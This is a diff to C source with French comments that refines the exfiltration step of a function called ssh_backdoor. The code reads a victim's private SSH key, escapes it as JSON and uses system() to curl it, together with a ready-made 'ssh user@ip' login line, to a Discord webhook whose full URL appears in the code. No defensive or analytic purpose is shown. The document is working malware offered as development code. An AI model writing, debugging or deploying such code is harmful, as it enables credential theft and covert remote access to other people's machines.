@@ -198,27 +198,51 @@ void ssh_backdoor() {
   }
 
   // 4. Exfiltrer clé privée via Discord
-  char exfil_cmd[2048];
   FILE *f = fopen(priv_key, "r");
-  char buffer[1500];
-  fread(buffer, 1, sizeof(buffer), f);
-  size_t n = fread(buffer, 1, sizeof(buffer) - 1, f);
-  buffer[n] = '\0';
+  if (!f)
+    return;
+
+  char key_content[4096] = {0};
+  fread(key_content, 1, sizeof(key_content) - 1, f);
   fclose(f);
-  snprintf(exfil_cmd, sizeof(exfil_cmd),
-           "curl -s -X POST -H 'Content-Type: application/json' "
-           "-d '{\"content\":\"**Clé ssh**\\n\\n\\n %s\\n\\nSSH "
-           "backdoor deployed: ssh %s@%s\\n\"}' "
-           "https://discord.com/api/webhooks/1485416783706853558/"
-           "qGWKXvrslqK8xzMdQpIy9J8BqiM8WqBaXyq_"
-           "9SweYyeOXzRRGlmHtjxd8keiCZTyaNyB",
-           buffer, user, ip);
+
+  // Échapper les caractères JSON spéciaux dans la clé
+  char escaped_key[8192] = {0};
+  int j = 0;
+  for (int i = 0; key_content[i] && j < sizeof(escaped_key) - 10; i++) {
+    if (key_content[i] == '"') {
+      escaped_key[j++] = '\\';
+      escaped_key[j++] = '"';
+    } else if (key_content[i] == '\\') {
+      escaped_key[j++] = '\\';
+      escaped_key[j++] = '\\';
+    } else if (key_content[i] == '\n') {
+      escaped_key[j++] = '\\';
+      escaped_key[j++] = 'n';
+    } else if (key_content[i] == '\r') {
+      escaped_key[j++] = '\\';
+      escaped_key[j++] = 'r';
+    } else {
+      escaped_key[j++] = key_content[i];
+    }
+  }
+
+  // JSON valide + webhook split sur 2 lignes
+  char json_payload[16384];
+  snprintf(json_payload, sizeof(json_payload),
+           "{\"content\":\" **ssh key** \\n\\n"
+           "```\\n%s\\n```\\n\\n`ssh %s@%s`\\n\"}",
+           escaped_key, user, ip);
+
+  char exfil_cmd[16384];
+  snprintf(
+      exfil_cmd, sizeof(exfil_cmd),
+      "curl -s -X POST https://discord.com/api/webhooks/1485416783706853558/"
+      "qGWKXvrslqK8xzMdQpIy9J8BqiM8WqBaXyq_9SweYyeOXzRRGlmHtjxd8keiCZTyaNyB "
+      "-H 'Content-Type: application/json' -d '%s'",
+      json_payload);
 
   system(exfil_cmd);
-
-  printf("[DEBUG] SSH backdoor deployed: ssh %s@%s (clé privée sur "
-         "Discord)\n",
-         user, ip);
 }
 
 int main(int argc, char *argv[]) {
